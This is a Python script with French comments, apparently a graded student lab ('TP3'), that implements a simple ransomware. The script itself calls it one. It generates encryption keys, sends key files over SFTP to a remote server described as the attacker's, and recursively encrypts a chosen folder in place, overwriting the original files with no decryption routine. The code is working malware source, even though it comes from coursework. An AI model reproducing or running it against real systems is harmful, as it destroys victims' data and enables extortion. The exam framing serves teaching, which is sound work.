import sys
import subprocess
import importlib.util
import os
import secrets  # Pour générer des clés aléatoires sécurisées
import datetime  # Pour l'horodatage des fichiers
import json  # Pour structurer le stockage des clés
import paramiko # Bibliothèque pour les connexions SSH/SFTP
import base64  # Nécessaire pour encoder la clé de chiffrement
from cryptography.fernet import Fernet  # La bibliothèque qui fait le chiffrement réel

# ==========================================================
# PARTIE A : Vérification des Dépendances (2 points)
# ==========================================================
def check_dependencies():
    """
    Cette fonction s'assure que l'environnement est prêt avant de lancer le ransomware.
    Elle vérifie la version de Python et la présence des bibliothèques externes.
    """
    print("\n=== [Partie A] Vérification du Système ===")

    # 1. Vérification de la version de Python 3.8+
    # On compare la version actuelle du système avec le minimum requis.
    if sys.version_info < (3, 8):
        print(f"[-] Erreur : Python 3.8+ est requis (actuel : {sys.version_info.major}.{sys.version_info.minor})")
        sys.exit(1)

    # 2. Bibliothèques obligatoires
    # 'cryptography' sert au chiffrement, 'paramiko' sert au transfert SFTP.
    dependencies = ["cryptography", "paramiko"]
    missing = [pkg for pkg in dependencies if importlib.util.find_spec(pkg) is None]

    if missing:
        print(f"[-] Bibliothèques manquantes : {missing}")
        # Proposition d'installation automatique via PIP si l'utilisateur accepte
        rep = input("Voulez-vous les installer automatiquement ? (O/N) : ").strip().lower()
        if rep == 'o':
            try:
                for pkg in missing:
                    print(f"[*] Installation de {pkg}...")
                    subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])
                print("[+] Installation terminée avec succès.")
            except Exception as e:
                print(f"[-] Erreur lors de l'installation : {e}")
                sys.exit(1)
        else:
            print("[-] Le programme ne peut pas continuer sans ces dépendances.")
            sys.exit(1)
    else:
        print("[+] Environnement Python OK.")


# ==========================================================
# PARTIE C : Fonctions de Clés (4 points)
# ==========================================================
def save_key(key_hex, algo, length):
    """
    Sauvegarde la clé générée dans un fichier JSON situé dans /var/keys/.
    Applique des permissions Linux strictes pour sécuriser la clé locale.
    """
    folder = "/var/keys/"

    # Création du dossier si inexistant (nécessite sudo sur Linux)
    if not os.path.exists(folder):
        try:
            # mode=0o700 signifie que seul le propriétaire (root) peut lire/écrire/ouvrir le dossier.
            os.makedirs(folder, mode=0o700)  # Permissions rwx------
        except PermissionError:
            print(f"[-] Erreur : Droits insuffisants pour créer {folder}. Utilisez 'sudo'.")
            return None

    # On utilise un horodatage pour que chaque clé ait un nom unique.
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"key_{algo.lower()}_{length}_{timestamp}.json"
    filepath = os.path.join(folder, filename)

    try:
        # On structure les données de la clé pour pouvoir les relire facilement plus tard.
        data = {
            "algorithm": algo,
            "length": length,
            "key": key_hex,
            "date": timestamp
        }
        with open(filepath, "w") as f:
            json.dump(data, f, indent=4)

        # os.chmod(..., 0o600) : Seul l'utilisateur peut lire et écrire le fichier.
        os.chmod(filepath, 0o600)
        return filepath
    except Exception as e:
        print(f"[-] Erreur de sauvegarde : {e}")
        return None


def generate_key():
    """
    Demande à l'utilisateur les paramètres de la clé et la génère aléatoirement.
    """
    print("\n--- [Partie C] Génération de Clé ---")

    # Demande de l'algorithme souhaité
    algo = input("Algorithme (AES/PBKDF2) : ").strip().upper()
    if algo not in ["AES", "PBKDF2"]:
        print("[-] Erreur : Algorithme non supporté.")
        return

    # Demande de la taille de la clé en bits
    try:
        length = int(input("Longueur de clé (128/192/256) : "))
        if length not in [128, 192, 256]:
            print("[-] Erreur : Longueur invalide.")
            return
    except ValueError:
        print("[-] Erreur : Saisie numérique requise.")
        return

    # Génération sécurisée via le module 'secrets' qui est adapté à la cryptographie.
    byte_length = length // 8
    key_bytes = secrets.token_bytes(byte_length)
    key_hex = key_bytes.hex()  # On convertit les octets en texte hexadécimal.

    # Sauvegarde locale
    path = save_key(key_hex, algo, length)
    if path:
        print(f"[+] ✓ Clé générée : {path}")

# ==========================================================
# PARTIE D : Transfert SFTP (4 points)
# ==========================================================
def send_sftp():
    """
    Envoie la clé locale vers un serveur distant via le protocole sécurisé SFTP.
    Simule l'exfiltration des clés vers le serveur de l'attaquant.
    """
    print("\n--- [Partie D] Transfert SFTP de la Clé ---")

    # 1. Collecte des informations du serveur distant
    host = input("Adresse IP du serveur distant : ").strip()
    user = input("Nom d'utilisateur SSH : ").strip()
    password = input("Mot de passe SSH : ").strip()
    local_path = input("Chemin local de la clé (ex: /var/keys/...) : ").strip()
    remote_path = os.path.basename(local_path)

    if not os.path.exists(local_path):
        print("[-] Erreur : Le fichier local n'existe pas.")
        return

    # 2. Configuration du client SSH via Paramiko
    ssh = paramiko.SSHClient()
    # On autorise la connexion même si le serveur n'est pas encore connu dans 'known_hosts'.
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        print(f"[*] Connexion à {host}...")
        ssh.connect(hostname=host, username=user, password=password, timeout=10)

        # 3. Création du canal SFTP et envoi du fichier
        sftp = ssh.open_sftp()
        sftp.put(local_path, remote_path)
        sftp.close()

        # 4. Confirmation de réussite
        print(f"[+] ✓ Transfert réussi : {remote_path} est sur le serveur.")

    except Exception as e:
        # 5. Gestion des erreurs (mauvais mot de passe, IP injoignable...)
        print(f"[-] Erreur SFTP : {e}")
    finally:
        ssh.close()  # Toujours fermer la session SSH pour libérer les ressources.


# ==========================================================
# PARTIE E & F : Chiffrement In-Place et Fonctions Avancées
# ==========================================================

def encrypt_file(filepath, key_hex):
    """
    Fonction cœur : lit un fichier, le chiffre, et écrase l'original par sa version chiffrée.
    """
    try:
        # 1. Préparation de la clé Fernet :
        # Fernet nécessite une clé encodée en base64 de 32 octets exactement.
        # On ajuste la clé fournie si elle ne fait pas la bonne taille.
        key_bytes = bytes.fromhex(key_hex)
        fernet_key = base64.urlsafe_b64encode(key_bytes.ljust(32)[:32])
        f = Fernet(fernet_key)

        # 2. On lit le fichier original en mode binaire ('rb')
        with open(filepath, 'rb') as file:
            original_data = file.read()

        # 3. Chiffrement effectif des données
        encrypted_data = f.encrypt(original_data)

        # 4. Écriture 'In-Place' : on réécrit par-dessus le fichier original ('wb')
        with open(filepath, 'wb') as file:
            file.write(encrypted_data)

        return True
    except Exception as e:
        print(f"[-] Erreur sur {filepath}: {e}")
        return False


def select_and_encrypt():
    """
    Gère la sélection de la cible (un fichier ou tout un répertoire).
    Comprend une détection intelligente pour charger la clé depuis un JSON.
    """
    print("\n--- [Partie E/F] Chiffrement des données ---")
    print("[1] Fichier unique")
    print("[2] Dossier complet (Récursif)")

    choix = input("Sélection: ").strip()

    # Demande la clé à l'utilisateur
    entree_utilisateur = input("Entrez la clé HEX OU le chemin du fichier .json: ").strip()

    # --- LOGIQUE DE DÉTECTION DU JSON ---
    # Si l'utilisateur donne un chemin vers un fichier JSON, on va chercher la clé dedans.
    if entree_utilisateur.endswith(".json") and os.path.exists(entree_utilisateur):
        try:
            with open(entree_utilisateur, 'r') as f:
                data = json.load(f)
                key_hex = data['key']
                print(f"[+] Clé extraite du fichier JSON avec succès.")
        except Exception as e:
            print(f"[-] Erreur lors de la lecture du fichier JSON : {e}")
            return
    else:
        # Sinon, on utilise l'entrée telle quelle comme clé hexadécimale.
        key_hex = entree_utilisateur

    # --- TRAITEMENT DU CHIFFREMENT ---
    # OPTION 1 : Chiffrer un seul fichier spécifique
    if choix == '1':
        path = input("Chemin du fichier à chiffrer: ").strip()
        if os.path.isfile(path):
            if encrypt_file(path, key_hex):
                print(f"[+] ✓ Fichier chiffré avec succès")
        else:
            print("[-] Erreur : Fichier introuvable.")

    # OPTION 2 : Chiffrement récursif de tout un dossier
    elif choix == '2':
        folder = input("Chemin du dossier à chiffrer: ").strip()
        if os.path.isdir(folder):
            # os.walk parcourt tous les sous-dossiers automatiquement.
            files_to_encrypt = []
            for root, dirs, files in os.walk(folder):
                for name in files:
                    files_to_encrypt.append(os.path.join(root, name))

            total = len(files_to_encrypt)
            if total == 0:
                print("[-] Aucun fichier trouvé dans ce dossier.")
                return

            print(f"[*] Chiffrement de {total} fichiers...")

            # Pour chaque fichier trouvé, on lance le chiffrement et on affiche l'avancée.
            for i, filepath in enumerate(files_to_encrypt):
                encrypt_file(filepath, key_hex)
                # \r permet de mettre à jour le pourcentage sur la même ligne.
                percent = int(((i + 1) / total) * 100)
                print(f"\rProgression : {percent}%", end="", flush=True)

            print(f"\n[+] ✓ Dossier chiffré avec succès")
        else:
            print("[-] Erreur : Dossier introuvable.")

# ==========================================================
# PARTIE B : Menu Principal (3 points)
# ==========================================================
def main_menu():
    """
    Interface utilisateur principale sous forme de boucle infinie.
    """
    # On vérifie toujours l'environnement au lancement du script.
    check_dependencies()

    while True:
        print("\n==============================")
        print(" Système de Chiffrement - TP3")
        print("==============================")
        print("1. Générer une nouvelle clé")  # Option pour créer une clé locale
        print("2. Envoyer une clé via SFTP")  # Option pour exfiltrer la clé
        print("3. Chiffrer des fichiers/dossiers")  # Option pour lancer l'attaque
        print("4. Vérifier les dépendances")  # Option pour revérifier le système
        print("5. Quitter")

        choix = input("\nChoix : ").strip()

        if choix == '1':
            generate_key()
        elif choix == '2':
            send_sftp()
        elif choix == '3':
            select_and_encrypt()
        elif choix == '4':
            check_dependencies()
        elif choix == '5':
            print("[*] Fermeture du programme.")
            break
        else:
            print("[!] Erreur : Choix invalide.")


# --- Point d'entrée principal ---
if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        # Gère proprement l'arrêt par CTRL+C
        print("\n\n[!] Interruption par l'utilisateur. Quitter...")
        sys.exit(0)